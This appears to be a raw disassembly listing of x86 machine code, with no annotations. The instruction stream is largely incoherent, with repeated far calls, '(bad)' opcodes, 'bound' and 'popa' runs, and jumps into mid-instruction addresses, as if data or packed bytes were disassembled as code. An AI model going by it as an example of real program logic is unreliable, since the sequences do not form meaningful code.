  4328ab:	or     eax,0xb850875
  4328b0:	call   0xa8e8:0x5e343ac9
  4328b7:	popa   
  4328b8:	pop    ss
  4328b9:	jne    0x432924
  4328bb:	or     eax,0xa20df975
  4328c0:	rcr    al,cl
  4328c2:	xrelease xchg BYTE PTR [edi],dl
  4328c5:	jne    0x432924
  4328c7:	or     eax,0xa20df975
  4328cc:	stos   BYTE PTR es:[edi],al
  4328cd:	fimul  DWORD PTR ds:0x997ff9cd
  4328d3:	mov    esi,0x750d7de7
  4328d8:	stc    
  4328d9:	or     eax,0x4adaaaa2
  4328de:	pop    eax
  4328df:	or     eax,0x997ff9cd
  4328e4:	mov    esi,0x56f9cd0d
  4328e9:	cdq    
  4328ea:	stos   BYTE PTR es:[edi],al
  4328eb:	pop    ss
  4328ec:	loop   0x4328bc
  4328ee:	bound  esp,QWORD PTR [edx+0x62]
  4328f1:	out    dx,al
  4328f2:	xchg   BYTE PTR ds:0xa20df975,cl
  4328f8:	mov    esi,0x62cee217
  4328fd:	bound  esp,QWORD PTR [edx+0xd]
  432900:	loop   0x4328d0
  432902:	bound  esp,QWORD PTR [edx+0x62]
  432905:	pop    ss
  432906:	jne    0x4328b9
  432908:	or     eax,0xb850875
  43290d:	call   0xa8e8:0x5e343ac9
  432914:	popa   
  432915:	pop    ss
  432916:	jne    0x43292c
  432918:	or     eax,0xb850875
  43291d:	call   0xa8e8:0x5e343ac9
  432924:	popa   
  432925:	pop    ss
  432926:	jne    0x432988
  432928:	or     eax,0xb850875
  43292d:	call   0xa8e8:0x5e343ac9
  432934:	popa   
  432935:	or     eax,0x681792cd
  43293a:	and    DWORD PTR [ebp-0x53],esi
  43293d:	and    eax,0x216901e2
  432942:	jne    0x432999
  432944:	mov    bl,0xe2
  432946:	add    DWORD PTR [ecx+0x21],ebp
  432949:	jne    0x432997
  43294b:	and    esp,edx
  43294d:	add    DWORD PTR [ecx+0x21],ebp
  432950:	jne    0x432972
  432952:	and    dl,ah
  432954:	add    DWORD PTR [ecx+0xd],ebp
  432957:	jne    0x43297d
  432959:	test   DWORD PTR [ebx],ecx
  43295b:	call   0xa8e8:0x5e343ac9
  432962:	popa   
  432963:	or     eax,0xba93b1cd
  432968:	pusha  
  432969:	or     eax,0xb850875
  43296e:	call   0x135d:0xa50d3ac9
  432975:	outs   dx,BYTE PTR ds:[esi]
  432976:	xchg   edx,eax
  432977:	pop    esi
  432978:	call   0x60ea8b25
  43297d:	xchg   ebx,eax
  43297e:	fdiv   st,st(3)
  432980:	mul    DWORD PTR [ecx+0x61]
  432983:	or     eax,0xb850875
  432988:	call   0xa8e8:0x5e343ac9
  43298f:	popa   
  432990:	pop    ss
  432991:	jne    0x4329fc
  432993:	or     eax,0x75568675
  432998:	mov    cl,0x17
  43299a:	jne    0x4329f0
  43299c:	bound  esi,QWORD PTR [edx-0x794d9dac]
  4329a2:	bound  esi,QWORD PTR [edx-0x2a270c07]
  4329a8:	popa   
  4329a9:	popa   
  4329aa:	pop    ss
  4329ab:	jne    0x4329ae
  4329ad:	and    edx,esp
  4329af:	fbld   TBYTE PTR [edx+0x62]
  4329b2:	bound  edx,QWORD PTR [edx+eiz*8]
  4329b5:	add    DWORD PTR [ecx+0xd],ebp
  4329b8:	loop   0x432999
  4329ba:	bound  esp,QWORD PTR [edx+0x62]
  4329bd:	test   DWORD PTR [ebx],ecx
  4329bf:	call   0xa8e8:0x5e343ac9
  4329c6:	popa   
  4329c7:	rcl    BYTE PTR [ebx],cl
  4329c9:	jne    0x4329a6
  4329cb:	shl    bl,cl
  4329cd:	cli    
  4329ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4329cf:	popa   
  4329d0:	popa   
  4329d1:	fsubr  st,st(2)
  4329d3:	add    DWORD PTR [ecx-0x19],esp
  4329d6:	out    0xd,al
  4329d8:	loop   0x4329b9
  4329da:	bound  esp,QWORD PTR [edx+0x62]
  4329dd:	test   DWORD PTR [ebx],ecx
  4329df:	call   0xa8e8:0x5e343ac9
  4329e6:	popa   
  4329e7:	shl    BYTE PTR [edx-0x4e],cl
  4329ea:	add    DWORD PTR [ebx],edx
  4329ec:	jne    0x4329c9
  4329ee:	shl    bl,cl
  4329f0:	jae    0x432a1f
  4329f2:	popa   
  4329f3:	popa   
  4329f4:	or     eax,0xe2175475
  4329f9:	out    0x62,al
  4329fb:	bound  esp,QWORD PTR [edx+0xd]
  4329fe:	jne    0x432986
  432a00:	or     eax,0x6262e613
  432a05:	bound  ebp,QWORD PTR ds:0xe6131760
  432a0b:	bound  esp,QWORD PTR [edx+0x62]
  432a0e:	or     eax,0x6262e6e2
  432a13:	bound  ecx,QWORD PTR ds:0xd10d01cd
  432a19:	xchg   BYTE PTR ds:0xd05601a5,cl
  432a1f:	xchg   edx,eax
  432a20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432a21:	pop    ds
  432a22:	call   0x1b837aa
  432a27:	or     eax,0xcd0d86a2
  432a2c:	add    DWORD PTR [esi-0x67],edx
  432a2f:	call   0x6262:0x62e6130d
  432a36:	sub    eax,0xb175561f
  432a3b:	pop    ss
  432a3c:	jne    0x4329ef
  432a3e:	lock (bad) 
  432a40:	bound  esp,QWORD PTR [edx+0x62]
  432a43:	jo     0x4329cb
  432a45:	bound  esi,QWORD PTR [edx-0xc8aecac]
  432a4b:	shl    bl,cl
  432a4d:	push   0x2d
  432a4f:	popa   
  432a50:	popa   
  432a51:	and    edx,esp
  432a53:	jmp    0x432ab7
  432a55:	bound  esp,QWORD PTR [edx-0x53]
  432a58:	loop   0x432a5b
  432a5a:	imul   esp,DWORD PTR [ecx],0x6262e7e2
  432a60:	bound  esp,QWORD PTR ds:0x216901e2
  432a66:	jne    0x432a65
  432a68:	mov    bl,0xe2
  432a6a:	add    DWORD PTR [ecx+0x21],ebp
  432a6d:	jne    0x432a7b
  432a6f:	and    esp,edx
  432a71:	add    DWORD PTR [ecx+0x13],ebp
  432a74:	loop   0x432a61
  432a76:	bound  esp,QWORD PTR [edx+0x62]
  432a79:	pop    ss
  432a7a:	jne    0x432a80
  432a7c:	adc    esp,edx
  432a7e:	out    0x62,eax
  432a80:	bound  esp,QWORD PTR [edx+0x17]
  432a83:	loop   0x432a68
  432a85:	bound  esp,QWORD PTR [edx+0x62]
  432a88:	adc    esi,DWORD PTR [ebp-0x3]
  432a8b:	pop    ss
  432a8c:	jne    0x432a77
  432a8e:	adc    esi,DWORD PTR [ebp+0xc]
  432a91:	pop    ss
  432a92:	jne    0x432a89
  432a94:	or     eax,0xb850875
  432a99:	call   0xa8e8:0x5e343ac9
  432aa0:	popa   
  432aa1:	pop    ss
  432aa2:	jne    0x432ab4
  432aa4:	and    edx,esp
  432aa6:	jp     0x432b0a
  432aa8:	bound  esp,QWORD PTR [edx-0x53]
  432aab:	loop   0x432aae
  432aad:	imul   ebp,esi,0x7ae20dd4
  432ab3:	bound  esp,QWORD PTR [edx+0x62]
  432ab6:	test   DWORD PTR [ebx],ecx
  432ab8:	call   0xd624:0xcd0d3ac9
  432abf:	outs   dx,DWORD PTR ds:[esi]
  432ac0:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  432ac6:	call   0xb85:0x61a8e85e
  432acd:	call   0x627a:0xe2173ac9
  432ad4:	bound  esp,QWORD PTR [edx+0xd]
  432ad7:	jne    0x432b42
  432ad9:	or     eax,0x6fd608cd
  432ade:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432ae4:	pop    esi
  432ae5:	call   0x1fea8c92
  432aea:	xchg   ebx,eax
  432aeb:	loop   0x432aa8
  432aed:	pop    edi
  432aee:	popa   
  432aef:	popa   
  432af0:	(bad)  
  432af1:	and    edi,DWORD PTR [edx+0x62]
  432af4:	bound  esp,QWORD PTR [edx-0x4d]
  432af7:	loop   0x432afa
  432af9:	imul   edx,DWORD PTR [ebx+0x615f0a6e],0x24750d61
  432b03:	test   DWORD PTR [ebx],ecx
  432b05:	call   0xa8e8:0x5e343ac9
  432b0c:	popa   
  432b0d:	pop    ss
  432b0e:	jne    0x432b79
  432b10:	or     eax,0x62627ae2
  432b15:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  432b1b:	or     eax,0x6e1310cd
  432b20:	push   0x61a8e85e
  432b25:	pop    ss
  432b26:	jne    0x432b38
  432b28:	or     eax,0xcd0d1075
  432b2d:	and    al,0xd6
  432b2f:	outs   dx,DWORD PTR ds:[esi]
  432b30:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432b36:	pop    esi
  432b37:	call   0x1fea8ce4
  432b3c:	mov    dl,0x81
  432b3e:	or     eax,0xb850875
  432b43:	call   0xa8e8:0x5e343ac9
  432b4a:	popa   
  432b4b:	shl    BYTE PTR [eax-0x7a],cl
  432b4e:	adc    esi,DWORD PTR [ebp-0xd]
  432b51:	shl    bl,cl
  432b53:	call   0x475:0xd62623f
  432b5a:	or     eax,0x9a0b8561
  432b5f:	leave  
  432b60:	cmp    dl,BYTE PTR [ebx+0x35346e06]
  432b66:	call   0xcd508d13
  432b6b:	or     dh,dl
  432b6d:	outs   dx,DWORD PTR ds:[esi]
  432b6e:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432b74:	pop    esi
  432b75:	call   0x1fea8d22
  432b7a:	out    0xe8,eax
  432b7c:	or     eax,0x6262e3e2
  432b81:	bound  ecx,QWORD PTR ds:0x9a0b8561
  432b87:	leave  
  432b88:	cmp    dl,BYTE PTR [ebx+0x35346e06]
  432b8e:	call   0xcd508d3b
  432b93:	or     dh,dl
  432b95:	outs   dx,DWORD PTR ds:[esi]
  432b96:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432b9c:	pop    esi
  432b9d:	call   0x1fea8d4a
  432ba2:	out    0xd0,eax
  432ba4:	or     eax,0x610de975
  432ba9:	test   DWORD PTR [ebx],ecx
  432bab:	call   0x346e:0x6933ac9
  432bb2:	xor    eax,0xd61a8e8
  432bb7:	int    0x8
  432bb9:	(bad)  
  432bba:	outs   dx,DWORD PTR ds:[esi]
  432bbb:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432bc1:	pop    esi
  432bc2:	call   0x1fea8d6f
  432bc7:	out    0xd5,eax
  432bc9:	or     eax,0x610df575
  432bce:	test   DWORD PTR [ebx],ecx
  432bd0:	call   0x346e:0x6933ac9
  432bd7:	xor    eax,0xd61a8e8
  432bdc:	int    0x8
  432bde:	(bad)  
  432bdf:	outs   dx,DWORD PTR ds:[esi]
  432be0:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432be6:	pop    esi
  432be7:	call   0x1fea8d94
  432bec:	mov    dl,0x6b
  432bee:	or     eax,0xb850875
  432bf3:	call   0xa8e8:0x5e343ac9
  432bfa:	popa   
  432bfb:	pop    ss
  432bfc:	jne    0x432c67
  432bfe:	lock adc ch,BYTE PTR [eax+0x61]
  432c02:	popa   
  432c03:	or     eax,0x610d0475
  432c08:	test   DWORD PTR [ebx],ecx
  432c0a:	call   0x346e:0x6933ac9
  432c11:	ret    0xa8e8
  432c14:	popa   
  432c15:	or     eax,0x910de9cd
  432c1a:	(bad)  
  432c1b:	outs   dx,DWORD PTR ds:[esi]
  432c1c:	or     ebx,DWORD PTR [edx+0x6933ac9]
  432c22:	adc    BYTE PTR [ebp+0x61a8e835],cl
  432c28:	or     eax,0x880d04a5
  432c2d:	(bad)  
  432c2e:	or     bx,WORD PTR [edx+0x6933ac9]
  432c35:	jmp    0xa92b61a5
  432c3a:	popa   
  432c3b:	or     eax,0x6262e30b
  432c40:	bound  ecx,QWORD PTR ds:0xb4bd684
  432c46:	call   0x8508:0x6933ac9
  432c4d:	xor    eax,0xaf61a8e8
  432c52:	es xchg edi,eax
  432c54:	dec    esi
  432c55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432c56:	pop    ds
  432c57:	xchg   ebx,eax
  432c58:	loop   0x432c95
  432c5a:	push   0xe20d6161
  432c5f:	jecxz  0x432cc3
  432c61:	bound  esp,QWORD PTR [edx+0xd]
  432c64:	popa   
  432c65:	test   DWORD PTR [ebx],ecx
  432c67:	call   0x346e:0x6933ac9
  432c6e:	ret    0xa8e8
  432c71:	popa   
  432c72:	or     eax,0x910df5cd
  432c77:	(bad)  
  432c78:	outs   dx,DWORD PTR ds:[esi]
  432c79:	or     ebx,DWORD PTR [edx+0x6933ac9]
  432c7f:	adc    BYTE PTR [ebp+0x61a8e835],cl
  432c85:	or     eax,0x6262e3e4
  432c8a:	bound  ecx,QWORD PTR ds:0xb66d688
  432c90:	call   0x6be9:0x6933ac9
  432c97:	xor    eax,0xd61a8e8
  432c9c:	mov    dl,0xe9
  432c9e:	or     eax,0xb4bd684
  432ca3:	call   0x8508:0x6933ac9
  432caa:	xor    eax,0xaf61a8e8
  432caf:	es xchg edi,eax
  432cb1:	dec    esi
  432cb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432cb3:	pop    ds
  432cb4:	xchg   ebx,eax
  432cb5:	loop   0x432c67
  432cb7:	popa   
  432cb8:	popa   
  432cb9:	popa   
  432cba:	or     eax,0x610de975
  432cbf:	test   DWORD PTR [ebx],ecx
  432cc1:	call   0x346e:0x6933ac9
  432cc8:	ret    0xa8e8
  432ccb:	popa   
  432ccc:	or     eax,0x910d04cd
  432cd1:	(bad)  
  432cd2:	outs   dx,DWORD PTR ds:[esi]
  432cd3:	or     ebx,DWORD PTR [edx+0x6933ac9]
  432cd9:	adc    BYTE PTR [ebp+0x61a8e835],cl
  432cdf:	or     eax,0x880de9a5
  432ce4:	(bad)  
  432ce5:	or     bx,WORD PTR [edx+0x6933ac9]
  432cec:	jmp    0xa92b625c
  432cf1:	popa   
  432cf2:	or     eax,0x840df5b2
  432cf7:	(bad)  
  432cf8:	dec    ebx
  432cf9:	or     ebx,DWORD PTR [edx+0x6933ac9]
  432cff:	or     BYTE PTR [ebp+0x61a8e835],al
  432d05:	scas   eax,DWORD PTR es:[edi]
  432d06:	es xchg edi,eax
  432d08:	dec    esi
  432d09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432d0a:	pop    ds
  432d0b:	mov    dl,0xa4
  432d0d:	or     eax,0x610df575
  432d12:	test   DWORD PTR [ebx],ecx
  432d14:	call   0x346e:0x6933ac9
  432d1b:	ret    0xa8e8
  432d1e:	popa   
  432d1f:	or     eax,0x6262e313
  432d24:	bound  ecx,QWORD PTR ds:0xb6fd691
  432d2a:	call   0x8d10:0x6933ac9
  432d31:	xor    eax,0xd61a8e8
  432d36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432d37:	cmc    
  432d38:	or     eax,0xb66d688
  432d3d:	call   0x6be9:0x6933ac9
  432d44:	xor    eax,0xd61a8e8
  432d49:	mov    dl,0x4
  432d4b:	or     eax,0xb4bd684
  432d50:	call   0x8508:0x6933ac9
  432d57:	xor    eax,0xaf61a8e8
  432d5c:	es xchg edi,eax
  432d5e:	dec    esi
  432d5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432d60:	pop    ds
  432d61:	out    0x88,eax
  432d63:	or     eax,0xb850875
  432d68:	call   0xa8e8:0x5e343ac9
  432d6f:	popa   
  432d70:	pop    ss
  432d71:	jne    0x432ddc
  432d73:	out    dx,al
  432d74:	sti    
  432d75:	jo     0x432d11
  432d77:	adc    esi,DWORD PTR [ebp-0xd]
  432d7a:	shl    bl,cl
  432d7c:	jno    0x432d27
  432d7e:	popa   
  432d7f:	popa   
  432d80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432d81:	jne    0x432db4
  432d83:	out    0x92,eax
  432d85:	or     eax,0xb850875
  432d8a:	call   0xa8e8:0x5e343ac9
  432d91:	popa   
  432d92:	pop    ss
  432d93:	jne    0x432dfe
  432d95:	lock push 0x5c
  432d98:	bound  esp,QWORD PTR [edx+0xd]
  432d9b:	jne    0x432e06
  432d9d:	or     eax,0x6fd608cd
  432da2:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  432da8:	pop    esi
  432da9:	call   0x1fea8f56
  432dae:	mov    dl,0x80
  432db0:	or     eax,0xb852475
  432db5:	call   0x13b1:0xcd0d3ac9
  432dbc:	outs   dx,BYTE PTR ds:[esi]
  432dbd:	push   0x61a8e85e
  432dc2:	pop    ss
  432dc3:	jne    0x432d76
  432dc5:	lock adc BYTE PTR [esi+0x62],bl
  432dc9:	bound  esi,QWORD PTR [eax-0x76]
  432dcc:	bound  esi,QWORD PTR [edx+0x58751354]
  432dd2:	shl    bl,cl
  432dd4:	sbb    DWORD PTR [edx],eax
  432dd6:	popa   
  432dd7:	popa   
  432dd8:	or     eax,0xb850875
  432ddd:	call   0xa8e8:0x5e343ac9
  432de4:	popa   
  432de5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432de6:	jne    0x432df8
  432de8:	out    0x81,eax
  432dea:	or     eax,0xb850875
  432def:	call   0xa8e8:0x5e343ac9
  432df6:	popa   
  432df7:	shl    BYTE PTR [eax-0x76],cl
  432dfa:	adc    esi,DWORD PTR [ebp+0x58]
  432dfd:	shl    bl,cl
  432dff:	mov    dh,0x42
  432e01:	bound  esp,QWORD PTR [edx+0xd]
  432e04:	jne    0x432e5a
  432e06:	fcomp  DWORD PTR [edx+ecx*4]
  432e09:	pop    ss
  432e0a:	jne    0x432e20
  432e0c:	bound  esi,QWORD PTR [edx+0x14b26218]
  432e12:	or     eax,0x75569a75
  432e17:	dec    eax
  432e18:	shl    bl,cl
  432e1a:	rol    DWORD PTR [edx],1
  432e1c:	popa   
  432e1d:	popa   
  432e1e:	or     eax,0xb850875
  432e23:	call   0xa8e8:0x5e343ac9
  432e2a:	popa   
  432e2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432e2c:	jne    0x432e3e
  432e2e:	out    0x89,eax
  432e30:	jo     0x432e93
  432e32:	bound  esi,QWORD PTR [edx-0x658af2e8]
  432e38:	push   esi
  432e39:	jne    0x432e83
  432e3b:	shl    bl,cl
  432e3d:	jl     0x432e81
  432e3f:	bound  esp,QWORD PTR [edx+0xd]
  432e42:	jne    0x432dd6
  432e44:	pop    ss
  432e45:	loop   0x432e87
  432e47:	bound  esp,QWORD PTR [edx+0x62]
  432e4a:	or     eax,0x626240e2
  432e4f:	bound  ecx,QWORD PTR ds:0x9a5618cd
  432e55:	or     eax,0x626240e2
  432e5a:	bound  edx,QWORD PTR [edi]
  432e5c:	call   0x1875:0x56b1750d
  432e63:	pop    ss
  432e64:	jne    0x432e17
  432e66:	lock out dx,al
  432e68:	bound  esp,QWORD PTR [bp+si+0xd]
  432e6c:	jne    0x432e08
  432e6e:	mov    esp,0x61922257
  432e73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432e74:	or     eax,0x13c9c964
  432e79:	jne    0x432ed0
  432e7b:	pop    ss
  432e7c:	jne    0x432ee7
  432e7e:	or     eax,0x61216975
  432e83:	mov    eax,ds:0xd63a3b8c
  432e88:	jmp    0xb23a:0x3b8ca155
  432e8f:	imul   ecx,DWORD PTR ds:0xa2ff9275,0xfffffff7
  432e96:	sbb    BYTE PTR ds:0xa2ff8675,cl
  432e9c:	push   esi
  432e9d:	dec    ecx
  432e9e:	or     eax,0xa2ff8675
  432ea3:	neg    DWORD PTR [eax]
  432ea5:	or     eax,0x61ff9275
  432eaa:	adc    al,0x57
  432eac:	and    al,BYTE PTR [esi+0x640da561]
  432eb2:	(bad)  
  432eb3:	add    DWORD PTR fs:[ecx+0x61],esp
  432eb7:	popa   
  432eb8:	or     eax,0xb857e75
  432ebd:	call   0xa8e8:0x5e343ac9
  432ec4:	popa   
  432ec5:	pop    ss
  432ec6:	jne    0x432f31
  432ec8:	adc    al,0x7a
  432eca:	int3   
  432ecb:	popa   
  432ecc:	popa   
  432ecd:	xchg   esp,eax
  432ece:	pop    ss
  432ecf:	jne    0x432f29
  432ed1:	adc    al,0x34
  432ed3:	int3   
  432ed4:	popa   
  432ed5:	popa   
  432ed6:	xchg   esp,eax
  432ed7:	pop    ss
  432ed8:	jne    0x432f20
  432eda:	adc    al,0xe3
  432edc:	int3   
  432edd:	popa   
  432ede:	popa   
  432edf:	xchg   esp,eax
  432ee0:	pop    ss
  432ee1:	jne    0x432f0b
  432ee3:	adc    al,0xaa
  432ee5:	int3   
  432ee6:	popa   
  432ee7:	popa   
  432ee8:	xchg   esp,eax
  432ee9:	pop    ss
  432eea:	jne    0x432f12
  432eec:	adc    al,0xc4
  432eee:	int3   
  432eef:	popa   
  432ef0:	popa   
  432ef1:	xchg   esp,eax
  432ef2:	pop    ss
  432ef3:	jne    0x432f45
  432ef5:	adc    al,0xa3
  432ef7:	int3   
  432ef8:	popa   
  432ef9:	popa   
  432efa:	xchg   esp,eax
  432efb:	pop    ss
  432efc:	jne    0x432f3c
  432efe:	adc    al,0xe8
  432f00:	int3   
  432f01:	popa   
  432f02:	popa   
  432f03:	xchg   esp,eax
  432f04:	pop    ss
  432f05:	jne    0x432f43
  432f07:	adc    al,0x96
  432f09:	int3   
  432f0a:	popa   
  432f0b:	popa   
  432f0c:	xchg   esp,eax
  432f0d:	pop    ss
  432f0e:	jne    0x432f52
  432f10:	adc    al,0xe6
  432f12:	int3   
  432f13:	popa   
  432f14:	popa   
  432f15:	xchg   esp,eax
  432f16:	pop    ss
  432f17:	jne    0x432f61
  432f19:	adc    al,0x9d
  432f1b:	int3   
  432f1c:	popa   
  432f1d:	popa   
  432f1e:	xchg   esp,eax
  432f1f:	pop    ss
  432f20:	jne    0x432f58
  432f22:	adc    al,0x34
  432f24:	int3   
  432f25:	popa   
  432f26:	popa   
  432f27:	xchg   esp,eax
  432f28:	pop    ss
  432f29:	jne    0x432f43
  432f2b:	adc    al,0xa8
  432f2d:	int3   
  432f2e:	popa   
  432f2f:	popa   
  432f30:	xchg   esp,eax
  432f31:	pop    ss
  432f32:	jne    0x432f4a
  432f34:	adc    al,0xcc
  432f36:	inc    ebp
  432f37:	popa   
  432f38:	popa   
  432f39:	xchg   esp,eax
  432f3a:	pop    ss
  432f3b:	jne    0x432f30
  432f3d:	adc    al,0xd3
  432f3f:	es popa 
  432f41:	popa   
  432f42:	xchg   esp,eax
  432f43:	pop    ss
  432f44:	jne    0x432f37
  432f46:	adc    al,0xdc
  432f48:	dec    eax
  432f49:	popa   
  432f4a:	popa   
  432f4b:	xchg   esp,eax
  432f4c:	pop    ss
  432f4d:	jne    0x432fb3
  432f4f:	adc    al,0xdf
  432f51:	xor    DWORD PTR [ecx+0x61],esp
  432f54:	xchg   esp,eax
  432f55:	pop    ss
  432f56:	jne    0x432f45
  432f58:	adc    al,0xa3
  432f5a:	int3   
  432f5b:	popa   
  432f5c:	popa   
  432f5d:	xchg   esp,eax
  432f5e:	pop    ss
  432f5f:	jne    0x432f92
  432f61:	or     eax,0xb858a75
  432f66:	call   0xd68a:0xcd0d3ac9
  432f6d:	outs   dx,DWORD PTR ds:[esi]
  432f6e:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  432f74:	call   0xcd0d:0x61ce1b4b
  432f7b:	mov    dl,dh
  432f7d:	outs   dx,DWORD PTR ds:[esi]
  432f7e:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  432f84:	call   0xcd0d:0x61a8e85e
  432f8b:	mov    dl,dh
  432f8d:	outs   dx,DWORD PTR ds:[esi]
  432f8e:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  432f94:	call   0x7517:0x61a8e85e
  432f9b:	fisttp DWORD PTR ds:0xb857e75
  432fa1:	call   0xa8e8:0x5e343ac9
  432fa8:	popa   
  432fa9:	or     eax,0x6fd67ecd
  432fae:	or     ebx,DWORD PTR [edx+0x6e173ac9]
  432fb4:	adc    ebp,ebx
  432fb6:	dec    ebp
  432fb7:	push   edi
  432fb8:	popa   
  432fb9:	or     eax,0x610dfb75
  432fbe:	or     eax,0x6fd68acd
  432fc3:	or     ebx,DWORD PTR [edx-0x5df2c537]
  432fc9:	rcl    BYTE PTR [edi],cl
  432fcb:	outs   dx,BYTE PTR ds:[esi]
  432fcc:	adc    ebp,ebx
  432fce:	dec    ebp
  432fcf:	push   edi
  432fd0:	popa   
  432fd1:	or     eax,0xb858e75
  432fd6:	call   0xa8e8:0x5e343ac9
  432fdd:	popa   
  432fde:	or     eax,0x6fd68acd
  432fe3:	or     ebx,DWORD PTR [edx-0x5af2c537]
  432fe9:	mov    dl,dh
  432feb:	or     bx,WORD PTR [edx+0x10133ac9]
  432ff2:	mov    DWORD PTR [ebx+0x1b],ecx
  432ff5:	into   
  432ff6:	popa   
  432ff7:	pop    ss
  432ff8:	sub    al,0x13
  432ffa:	outs   dx,BYTE PTR ds:[esi]
  432ffb:	or     eax,0xb853875
  433000:	call   0xa8e8:0x5e343ac9
  433007:	popa   
  433008:	or     eax,0x6fd68acd
  43300d:	or     ebx,DWORD PTR [edx-0x5af2c537]
  433013:	mov    dl,dh
  433015:	or     bx,WORD PTR [edx+0x10133ac9]
  43301c:	mov    DWORD PTR [ebx+0x1b],ecx
  43301f:	into   
  433020:	popa   
  433021:	or     eax,0x66d68aa5
  433026:	or     ebx,DWORD PTR [edx+0x10133ac9]
  43302c:	mov    DWORD PTR [esi-0x18],ebx
  43302f:	test   al,0x61
  433031:	pop    ss
  433032:	sub    al,0x13
  433034:	outs   dx,BYTE PTR ds:[esi]
  433035:	adc    esi,DWORD PTR [ebp-0x25]
  433038:	ror    BYTE PTR ds:0xb858a75,cl
  43303e:	call   0xa8e8:0x5e343ac9
  433045:	popa   
  433046:	ror    BYTE PTR ds:0xbb349e75,cl
  43304c:	popa   
  43304d:	popa   
  43304e:	popa   
  43304f:	ror    BYTE PTR ds:0xdb0d9e75,cl
  433055:	cmc    
  433056:	push   0x72626161
  43305b:	bound  esp,QWORD PTR [ebp-0x2532f28e]
  433061:	pop    ss
  433062:	push   0xda2750d
  433067:	int    0xaa
  433069:	or     eax,0xd9a1791
  43306e:	jne    0x433006
  433070:	or     eax,0x910ddacd
  433075:	pop    ss
  433076:	call   0x9a0b:0x858a750d
  43307d:	leave  
  43307e:	cmp    cl,BYTE PTR ds:0x6fd68acd
  433084:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  43308a:	call   0xcd0d:0x61ce1b4b
  433091:	mov    dl,dh
  433093:	outs   dx,DWORD PTR ds:[esi]
  433094:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  43309a:	call   0xcd0d:0x61a8e85e
  4330a1:	mov    dl,dh
  4330a3:	outs   dx,DWORD PTR ds:[esi]
  4330a4:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  4330aa:	call   0x7517:0x61a8e85e
  4330b1:	fisttp DWORD PTR ds:0x610dda75
  4330b7:	or     eax,0x6fd67ecd
  4330bc:	or     ebx,DWORD PTR [edx+0x6e173ac9]
  4330c2:	adc    ebp,ebx
  4330c4:	dec    ebp
  4330c5:	push   edi
  4330c6:	popa   
  4330c7:	or     eax,0x610dfb75
  4330cc:	or     eax,0x6fd68acd
  4330d1:	or     ebx,DWORD PTR [edx-0x5df2c537]
  4330d7:	rcl    BYTE PTR [edi],cl
  4330d9:	outs   dx,BYTE PTR ds:[esi]
  4330da:	adc    ebp,ebx
  4330dc:	dec    ebp
  4330dd:	push   edi
  4330de:	popa   
  4330df:	or     eax,0xb85a675
  4330e4:	call   0xa8e8:0x5e343ac9
  4330eb:	popa   
  4330ec:	or     eax,0x6fd68acd
  4330f1:	or     ebx,DWORD PTR [edx-0x5af2c537]
  4330f7:	mov    dl,dh
  4330f9:	or     bx,WORD PTR [edx+0x10133ac9]
  433100:	mov    DWORD PTR [ebx+0x1b],ecx
  433103:	into   
  433104:	popa   
  433105:	pop    ss
  433106:	sub    al,0x13
  433108:	outs   dx,BYTE PTR ds:[esi]
  433109:	or     eax,0xb858a75
  43310e:	call   0xd68a:0xcd0d3ac9
  433115:	outs   dx,DWORD PTR ds:[esi]
  433116:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  43311c:	call   0xcd0d:0x61ce1b4b
  433123:	mov    dl,dh
  433125:	outs   dx,DWORD PTR ds:[esi]
  433126:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  43312c:	call   0xcd13:0x61a8e85e
  433133:	imul   edx,DWORD PTR [edi],0x136ee2c6
  433139:	jne    0x433116
  43313b:	ror    BYTE PTR ds:0xb858a75,cl
  433141:	call   0xa8e8:0x5e343ac9
  433148:	popa   
  433149:	ror    BYTE PTR ds:0xed349e75,cl
  43314f:	popa   
  433150:	popa   
  433151:	popa   
  433152:	ror    BYTE PTR ds:0xdb0d9e75,cl
  433158:	cmc    
  433159:	push   0x72626161
  43315e:	bound  esp,QWORD PTR [ebp-0x18e31d8e]
  433164:	(bad)  
  433165:	or     eax,0xb857e75
  43316a:	call   0xa8e8:0x5e343ac9
  433171:	popa   
  433172:	pop    ss
  433173:	loop   0x433158
  433175:	bound  esp,QWORD PTR [edx+0x62]
  433178:	out    dx,al
  433179:	xchg   DWORD PTR ds:0xb858a75,ecx
  43317f:	call   0x62e3:0x130d3ac9
  433186:	bound  esp,QWORD PTR [edx+0x13]
  433189:	outs   dx,BYTE PTR ds:[esi]
  43318a:	push   0x61a8e85e
  43318f:	pop    ss
  433190:	loop   0x433175
  433192:	bound  esp,QWORD PTR [edx+0x62]
  433195:	or     eax,0x610dfb75
  43319a:	or     eax,0x6262e313
  43319f:	bound  esp,QWORD PTR [edi-0x788c2d26]
  4331a5:	or     eax,0x610dda75
  4331aa:	or     eax,0x13562ccd
  4331af:	jecxz  0x433213
  4331b1:	bound  esp,QWORD PTR [edx+0xd]
  4331b4:	in     al,0xe3
  4331b6:	bound  esp,QWORD PTR [edx+0x62]
